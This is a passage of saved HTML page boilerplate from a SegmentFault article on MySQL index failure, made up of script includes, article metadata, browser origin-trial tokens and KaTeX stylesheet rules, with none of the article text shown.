思否_files/2.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/vendors_p__ArticleDetail_p__Live_p__QuestionDetail_p__Video.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/p__ArticleDetail.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/71.js.下载"></script><script async="true" defer="true" data-domain="segmentfault.com" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/plausible.js.下载" data-react-helmet="true"></script><script type="application/ld+json" data-react-helmet="true">{
+            "@context": "https://schema.org",
+            "@type": "Article",
+            "mainEntityOfPage": {
+              "@type": "WebPage",
+              "@id": "https://google.com/article"
+            },
+            "name": "一张图搞懂MySQL的索引失效",
+            "headline": "一张图搞懂MySQL的索引失效",
+            "image": "https://cdn.segmentfault.com/r-1d51384c/touch-icon.png",
+            "datePublished": "2020-01-02T05:21:31.000Z",
+            "dateModified": "2020-01-03T06:23:59.000Z",
+            "url": "https://segmentfault.com/a/1190000021464570",
+            "author": {
+              "@type": "Person",
+              "name": "张德Talk"
+            },
+            "publisher": {
+              "@type": "Organization",
+              "name": "SegmentFault",
+              "logo": {
+                "@type": "ImageObject",
+                "url":
+                  "https://assets.segmentfault.com/v-5fc4b0b2/global/img/static/touch-icon.png"
+              }
+            }
+          }</script><meta http-equiv="origin-trial" content="A+b/H0b8RPXNaJgaNFpO0YOFuGK6myDQXlwnJB3SwzvNMfcndat4DZYMrP4ClJIzYWo3/yP2S+8FTZ/lpqbPAAEAAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzVGhpcmRQYXJ0eSI6dHJ1ZX0="><meta http-equiv="origin-trial" content="A9ZgbRtm4pU3oZiuNzOsKcC8ppFSZdcjP2qYcdQrFKVzkmiWH1kdYY1Mi9x7G8+PS8HV9Ha9Cz0gaMdKsiVZIgMAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AxL6oBxcpn5rQDPKSAs+d0oxNyJYq2/4esBUh3Yx5z8QfcLu+AU8iFCXYRcr/CEEfDnkxxLTsvXPJFQBxHfvkgMAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A9KPtG5kl3oLTk21xqynDPGQ5t18bSOpwt0w6kGa6dEWbuwjpffmdUpR3W+faZDubGT+KIk2do0BX2ca16x8qAcAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A3HucHUo1oW9s+9kIKz8mLkbcmdaj5lxt3eiIMp1Nh49dkkBlg1Fhg4Fd/r0vL69mRRA36YutI9P/lJUfL8csQoAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A0OysezhLoCRYomumeYlubLurZTCmsjTb087OvtCy95jNM65cfEsbajrJnhaGwiTxhz38ZZbm+UhUwQuXfVPTg0AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="AxoOxdZQmIoA1WeAPDixRAeWDdgs7ZtVFfH2y19ziTgD1iaHE5ZGz2UdSjubkWvob9C5PrjUfkWi4ZSLgWk3Xg8AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A7+rMYR5onPnACrz+niKSeFdH3xw1IyHo2AZSHmxrofRk9w4HcQPMYcpBUKu6OQ6zsdxf4m/vqa6tG6Na4OLpAQAAAB4eyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><link rel="preload" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/f(7).txt" as="script"><script type="text/javascript" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/f(7).txt"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/66.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/67.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/68.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/55.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/64.js.下载"></script><script src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/katexCssLoader.js.下载"></script><style type="text/css">
+/* stylelint-disable font-family-no-missing-generic-family-keyword */
+@font-face {
+  font-family: 'KaTeX_AMS';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_AMS-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_AMS-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_AMS-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Caligraphic';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Caligraphic-Bold.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Caligraphic-Bold.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Caligraphic-Bold.ttf) format('truetype');
+  font-weight: bold;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Caligraphic';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Caligraphic-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Caligraphic-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Caligraphic-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Fraktur';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Fraktur-Bold.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Fraktur-Bold.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Fraktur-Bold.ttf) format('truetype');
+  font-weight: bold;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Fraktur';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Fraktur-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Fraktur-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Fraktur-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Main';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-Bold.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-Bold.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-Bold.ttf) format('truetype');
+  font-weight: bold;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Main';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-BoldItalic.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-BoldItalic.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-BoldItalic.ttf) format('truetype');
+  font-weight: bold;
+  font-style: italic;
+}
+@font-face {
+  font-family: 'KaTeX_Main';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-Italic.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-Italic.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-Italic.ttf) format('truetype');
+  font-weight: normal;
+  font-style: italic;
+}
+@font-face {
+  font-family: 'KaTeX_Main';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Main-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Math';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Math-BoldItalic.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Math-BoldItalic.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Math-BoldItalic.ttf) format('truetype');
+  font-weight: bold;
+  font-style: italic;
+}
+@font-face {
+  font-family: 'KaTeX_Math';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Math-Italic.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Math-Italic.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Math-Italic.ttf) format('truetype');
+  font-weight: normal;
+  font-style: italic;
+}
+@font-face {
+  font-family: 'KaTeX_SansSerif';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_SansSerif-Bold.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_SansSerif-Bold.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_SansSerif-Bold.ttf) format('truetype');
+  font-weight: bold;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_SansSerif';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_SansSerif-Italic.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_SansSerif-Italic.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_SansSerif-Italic.ttf) format('truetype');
+  font-weight: normal;
+  font-style: italic;
+}
+@font-face {
+  font-family: 'KaTeX_SansSerif';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_SansSerif-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_SansSerif-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_SansSerif-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Script';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Script-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Script-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Script-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Size1';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size1-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size1-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size1-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Size2';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size2-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size2-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size2-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Size3';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size3-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size3-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size3-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Size4';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size4-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size4-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Size4-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Typewriter';
+  src: url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Typewriter-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Typewriter-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-1d51384c/fonts/katex/KaTeX_Typewriter-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+.katex {
+  font: normal 1.21em KaTeX_Main, Times New Roman, serif;
+  line-height: 1.2;
+  text-indent: 0;
+  text-rendering: auto;
+  border-color: currentColor;
+}
+.katex * {
+  -ms-high-contrast-adjust: none !important;
+}
+.katex .katex-version::after {
+  content: "0.12.0";
+}
+.katex .katex-mathml {
+  position: absolute;
+  clip: rect(1px, 1px, 1px, 1px);
+  padding: 0;
+  border: 0;
+  height: 1px;
+  width: 1px;
+  overflow: hidden;
+}
+.katex .katex-html {
+  /* 
+ewline is an empty block at top level, between .base elements */
+}
+.katex .katex-html > .newline {
+  display: block;
+}
+.katex .base {
+  position: relative;
+  display: inline-block;
+  white-space: nowrap;
+  width: min-content;
+}
+.katex .strut {
+  display: inline-block;
+}
+.katex .textbf {
+  font-weight: bold;
+}
+.katex .textit {
+  font-style: italic;
+}
+.katex .textrm {
+  font-family: KaTeX_Main;
+}
+.katex .textsf {
+  font-family: KaTeX_SansSerif;
+}
+.katex .texttt {
+  font-family: KaTeX_Typewriter;
+}
+.katex .mathnormal {
+  font-family: KaTeX_Math;
+  font-style: italic;
+}
+.katex .mathit {
+  font-family: KaTeX_Main;
+  font-style: italic;
+}
+.katex .mathrm {
+  font-style: normal;
+}
+.katex .mathbf {
+  font-family: KaTeX_Main;
+  font-weight: bold;
+}
+.katex .boldsymbol {
+  font-family: KaTeX_Math;
+  font-weight: bold;
+  font-style: italic;
+}
+.katex .amsrm {
+  font-family: KaTeX_AMS;
+}
+.katex .mathbb,
+.katex .textbb {
+  font-family: KaTeX_AMS;
+}
+.katex .mathcal {
+  font-family: KaTeX_Caligraphic;
+}
+.katex .mathfrak,
+.katex .textfrak {
+  font-family: KaTeX_Fraktur;
+}
+.katex .mathtt {
+  font-family: KaTeX_Typewriter;
+}
+.katex .mathscr,
+.katex .textscr {
+  font-family: KaTeX_Script;
+}
+.katex .mathsf,
+.katex .textsf {
+  font-family: KaTeX_SansSerif;
+}
+.katex .mathboldsf,
+.katex .textboldsf {
+  font-family: KaTeX_SansSerif;
+  font-weight: bold;
+}
+.katex .mathitsf,
+.katex .textitsf {
+  font-family: KaTeX_SansSerif;
+  font-style: italic;
+}
+.katex .mainrm {
+  font-family: KaTeX_Main;
+  font-style: normal;
+}
+.katex .vlist-t {
+  display: inline-table;
+  table-layout: fixed;
+  border-collapse: collapse;
+}
+.katex .vlist-r {
+  display: table-row;
+}
+.katex .vlist {
+  display: table-cell;
+  vertical-align: bottom;
+  position: relative;
+}
+.katex .vlist > span {
+  display: block;
+  height: 0;
+  position: relative;
+}
+.katex .vlist > span > span {
+  display: inline-block;
+}
+.katex .vlist > span > .pstrut {
+  overflow: hidden;
+  width: 0;
+}
+.katex .vlist-t2 {
+  margin-right: -2px;
+}
+.katex .vlist-s {
+  display: table-cell;
+  vertical-align: bottom;
+  font-size: 1px;
+  width: 2px;
+  min-width: 2px;
+}
+.katex .vbox {
+  display: -ms-inline-flexbox;
+  display: inline-flex;
+  -ms-flex-direction: column;
+  flex-direction: column;
+  align-items: baseline;
+}
+.katex .hbox {
+  display: -ms-inline-flexbox;
+  display: inline-flex;
+  -ms-flex-direction: row;
+  flex-direction: row;
+  width: 100%;
+}
+.katex .thinbox {
+  display: inline-flex;
+  flex-direction: row;
+  width: 0;
+  max-width: 0;
+}
+.katex .msupsub {
+  text-align: left;
+}
+.katex .mfrac > span > span {
+  text-align: center;
+}
+.katex .mfrac .frac-line {
+  display: inline-block;
+  width: 100%;
+  border-bottom-style: solid;
+}
+.katex .mfrac .frac-line,
+.katex .overline .overline-line,
+.katex .underline .underline-line,
+.katex .hline,
+.katex .hdashline,
+.katex .rule {
+  min-height: 1px;
+}
+.katex .mspace {
+  display: inline-block;
+}
+.katex .llap,
+.katex .rlap,
+.katex .clap {
+  width: 0;
+  position: relative;
+}
+.katex .llap > .inner,
+.katex .rlap > .inner,
+.katex .clap > .inner {
+  position: absolute;
+}
+.katex .llap > .fix,
+.katex .rlap > .fix,
+.katex .clap > .fix {
+  display: inline-block;
+}
+.katex .llap > .inner {
+  right: 0;
+}
+.katex .rlap > .inner,
+.katex .clap > .inner {
+  left: 0;
+}
+.katex .clap > .inner > span {
+  margin-left: -50%;
+  margin-right: 50%;
+}
+.katex .rule {
+  display: inline-block;
+  border: solid 0;
+  position: relative;
+}
+.katex .overline .overline-line,
+.katex .underline .underline-line,
+.katex .hline {
+  display: inline-block;
+  width: 100%;
+  border-bottom-style: solid;
+}
+.katex .hdashline {
+  display: inline-block;
+  width: 100%;
+  border-bottom-style: dashed;
+}
+.katex .sqrt > .root {
+  margin-left: 0.27777778em;
+  margin-right: -0.55555556em;
+}
+.katex .sizing.reset-size1.size1,
+.katex .fontsize-ensurer.reset-size1.size1 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size1.size2,
+.katex .fontsize-ensurer.reset-size1.size2 {
+  font-size: 1.2em;
+}
+.katex .sizing.reset-size1.size3,
+.katex .fontsize-ensurer.reset-size1.size3 {
+  font-size: 1.4em;
+}
+.katex .sizing.reset-size1.size4,
+.katex .fontsize-ensurer.reset-size1.size4 {
+  font-size: 1.6em;
+}
+.katex .sizing.reset-size1.size5,
+.katex .fontsize-ensurer.reset-size1.size5 {
+  font-size: 1.8em;
+}
+.katex .sizing.reset-size1.size6,
+.katex .fontsize-ensurer.reset-size1.size6 {
+  font-size: 2em;
+}
+.katex .sizing.reset-size1.size7,
+.katex .fontsize-ensurer.reset-size1.size7 {
+  font-size: 2.4em;
+}
+.katex .sizing.reset-size1.size8,
+.katex .fontsize-ensurer.reset-size1.size8 {
+  font-size: 2.88em;
+}
+.katex .sizing.reset-size1.size9,
+.katex .fontsize-ensurer.reset-size1.size9 {
+  font-size: 3.456em;
+}
+.katex .sizing.reset-size1.size10,
+.katex .fontsize-ensurer.reset-size1.size10 {
+  font-size: 4.148em;
+}
+.katex .sizing.reset-size1.size11,
+.katex .fontsize-ensurer.reset-size1.size11 {
+  font-size: 4.976em;
+}
+.katex .sizing.reset-size2.size1,
+.katex .fontsize-ensurer.reset-size2.size1 {
+  font-size: 0.83333333em;
+}
+.katex .sizing.reset-size2.size2,
+.katex .fontsize-ensurer.reset-size2.size2 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size2.size3,
+.katex .fontsize-ensurer.reset-size2.size3 {
+  font-size: 1.16666667em;
+}
+.katex .sizing.reset-size2.size4,
+.katex .fontsize-ensurer.reset-size2.size4 {
+  font-size: 1.33333333em;
+}
+.katex .sizing.reset-size2.size5,
+.katex .fontsize-ensurer.reset-size2.size5 {
+  font-size: 1.5em;
+}
+.katex .sizing.reset-size2.size6,
+.katex .fontsize-ensurer.reset-size2.size6 {
+  font-size: 1.66666667em;
+}
+.katex .sizing.reset-size2.size7,
+.katex .fontsize-ensurer.reset-size2.size7 {
+  font-size: 2em;
+}
+.katex .sizing.reset-size2.size8,
+.katex .fontsize-ensurer.reset-size2.size8 {
+  font-size: 2.4em;
+}
+.katex .sizing.reset-size2.size9,
+.katex .fontsize-ensurer.reset-size2.size9 {
+  font-size: 2.88em;
+}
+.katex .sizing.reset-size2.size10,
+.katex .fontsize-ensurer.reset-size2.size10 {
+  font-size: 3.45666667em;
+}
+.katex .sizing.reset-size2.size11,
+.katex .fontsize-ensurer.reset-size2.size11 {
+  font-size: 4.14666667em;
+}
+.katex .sizing.reset-size3.size1,
+.katex .fontsize-ensurer.reset-size3.size1 {
+  font-size: 0.71428571em;
+}
+.katex .sizing.reset-size3.size2,
+.katex .fontsize-ensurer.reset-size3.size2 {
+  font-size: 0.85714286em;
+}
+.katex .sizing.reset-size3.size3,
+.katex .fontsize-ensurer.reset-size3.size3 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size3.size4,
+.katex .fontsize-ensurer.reset-size3.size4 {
+  font-size: 1.14285714em;
+}
+.katex .sizing.reset-size3.size5,
+.katex .fontsize-ensurer.reset-size3.size5 {
+  font-size: 1.28571429em;
+}
+.katex .sizing.reset-size3.size6,
+.katex .fontsize-ensurer.reset-size3.size6 {
+  font-size: 1.42857143em;
+}
+.katex .sizing.reset-size3.size7,
+.katex .fontsize-ensurer.reset-size3.size7 {
+  font-size: 1.71428571em;
+}
+.katex .sizing.reset-size3.size8,
+.katex .fontsize-ensurer.reset-size3.size8 {
+  font-size: 2.05714286em;
+}
+.katex .sizing.reset-size3.size9,
+.katex .fontsize-ensurer.reset-size3.size9 {
+  font-size: 2.46857143em;
+}
+.katex .sizing.reset-size3.size10,
+.katex .fontsize-ensurer.reset-size3.size10 {
+  font-size: 2.96285714em;
+}
+.katex .sizing.reset-size3.size11,
+.katex .fontsize-ensurer.reset-size3.size11 {
+  font-size: 3.55428571em;
+}
+.katex .sizing.reset-size4.size1,
+.katex .fontsize-ensurer.reset-size4.size1 {
+  font-size: 0.625em;
+}
+.katex .sizing.reset-size4.size2,
+.katex .fontsize-ensurer.reset-size4.size2 {
+  font-size: 0.75em;
+}
+.katex .sizing.reset-size4.size3,
+.katex .fontsize-ensurer.reset-size4.size3 {
+  font-size: 0.875em;
+}
+.katex .sizing.reset-size4.size4,
+.katex .fontsize-ensurer.reset-size4.size4 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size4.size5,
+.katex .fontsize-ensurer.reset-size4.size5 {
+  font-size: 1.125em;
+}
+.katex .sizing.reset-size4.size6,
+.katex .fontsize-ensurer.reset-size4.size6 {
+  font-size: 1.25em;
+}
+.katex .sizing.reset-size4.size7,
+.katex .fontsize-ensurer.reset-size4.size7 {
+  font-size: 1.5em;
+}
+.katex .sizing.reset-size4.size8,
+.katex .fontsize-ensurer.reset-size4.size8 {
+  font-size: 1.8em;
+}
+.katex .sizing.reset-size4.size9,
+.katex .fontsize-ensurer.reset-size4.size9 {
+  font-size: 2.16em;
+}
+.katex .sizing.reset-size4.size10,
+.katex .fontsize-ensurer.reset-size4.size10 {
+  font-size: 2.5925em;
+}
+.katex .sizing.reset-size4.size11,
+.katex .fontsize-ensurer.reset-size4.size11 {
+  font-size: 3.11em;
+}
+.katex .sizing.reset-size5.size1,
+.katex .fontsize-ensurer.reset-size5.size1 {
+  font-size: 0.55555556em;
+}
+.katex .sizing.reset-size5.size2,
+.katex .fontsize-ensurer.reset-size5.size2 {
+  font-size: 0.66666667em;
+}
+.katex .sizing.reset-size5.size3,
+.katex .fontsize-ensurer.reset-size5.size3 {
+  font-size: 0.77777778em;
+}
+.katex .sizing.reset-size5.size4,
+.katex .fontsize-ensurer.reset-size5.size4 {
+  font-size: 0.88888889em;
+}
+.katex .sizing.reset-size5.size5,
+.katex .fontsize-ensurer.reset-size5.size5 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size5.size6,
+.katex .fontsize-ensurer.reset-size5.size6 {
+  font-size: 1.11111111em;
+}
+.katex .sizing.reset-size5.size7,
+.katex .fontsize-ensurer.reset-size5.size7 {
+  font-size: 1.33333333em;
+}
+.katex .sizing.reset-size5.size8,
+.katex .fontsize-ensurer.reset-size5.size8 {
+  font-size: 1.6em;
+}
+.katex .sizing.reset-size5.size9,
+.katex .fontsize-ensurer.reset-size5.size9 {
+  font-size: 1.92em;
+}
+.katex .sizing.reset-size5.size10,
+.katex .fontsize-ensurer.reset-size5.size10 {
+  font-size: 2.30444444em;
+}
+.katex .sizing.reset-size5.size11,
+.katex .fontsize-ensurer.reset-size5.size11 {
+  font-size: 2.76444444em;
+}
+.katex .sizing.reset-size6.size1,
+.katex .fontsize-ensurer.reset-size6.size1 {
+  font-size: 0.5em;
+}
+.katex .sizing.reset-size6.size2,
+.katex .fontsize-ensurer.reset-size6.size2 {
+  font-size: 0.6em;
+}
+.katex .sizing.reset-size6.size3,
+.katex .fontsize-ensurer.reset-size6.size3 {
+  font-size: 0.7em;
+}
+.katex .sizing.reset-size6.size4,
+.katex .fontsize-ensurer.reset-size6.size4 {
+  font-size: 0.8em;
+}
+.katex .sizing.reset-size6.size5,
+.katex .fontsize-ensurer.reset-size6.size5 {
+  font-size: 0.9em;
+}
+.katex .sizing.reset-size6.size6,
+.katex .fontsize-ensurer.reset-size6.size6 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size6.size7,
+.katex .fontsize-ensurer.reset-size6.size7 {
+  font-size: 1.2em;
+}
+.katex .sizing.reset-size6.size8,
+.katex .fontsize-ensurer.reset-size6.size8 {
+  font-size: 1.44em;
+}
+.katex .sizing.reset-size6.size9,
+.katex .fontsize-ensurer.reset-size6.size9 {
+  font-size: 1.728em;
+}
+.katex .sizing.reset-size6.size10,
+.katex .fontsize-ensurer.reset-size6.size10 {
+  font-size: 2.074em;
+}
+.katex .sizing.reset-size6.size11,
+.katex .fontsize-ensurer.reset-size6.size11 {
+  font-size: 2.488em;
+}
+.katex .sizing.reset-size7.size1,
+.katex .fontsize-ensurer.reset-size7.size1 {
+  font-size: 0.41666667em;
+}
+.katex .sizing.reset-size7.size2,
+.katex .fontsize-ensurer.reset-size7.size2 {
+  font-size: 0.5em;
+}
+.katex .sizing.reset-size7.size3,
+.katex .fontsize-ensurer.reset-size7.size3 {
+  font-size: 0.58333333em;
+}
+.katex .sizing.reset-size7.size4,
+.katex .fontsize-ensurer.reset-size7.size4 {
+  font-size: 0.66666667em;
+}
+.katex .sizing.reset-size7.size5,
+.katex .fontsize-ensurer.reset-size7.size5 {
+  font-size: 0.75em;
+}
+.katex .sizing.reset-size7.size6,
+.katex .fontsize-ensurer.reset-size7.size6 {
+  font-size: 0.83333333em;
+}
+.katex .sizing.reset-size7.size7,
+.katex .fontsize-ensurer.reset-size7.size7 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size7.size8,
+.katex .fontsize-ensurer.reset-size7.size8 {
+  font-size: 1.2em;
+}
+.katex .sizing.reset-size7.size9,
+.katex .fontsize-ensurer.reset-size7.size9 {
+  font-size: 1.44em;
+}
+.katex .sizing.reset-size7.size10,
+.katex .fontsize-ensurer.reset-size7.size10 {
+  font-size: 1.72833333em;
+}
+.katex .sizing.reset-size7.size11,
+.katex .fontsize-ensurer.reset-size7.size11 {
+  font-size: 2.07333333em;
+}
+.katex .sizing.reset-size8.size1,
+.katex .fontsize-ensurer.reset-size8.size1 {
+  font-size: 0.34722222em;
+}
+.katex .sizing.reset-size8.size2,
+.katex .fontsize-ensurer.reset-size8.size2 {
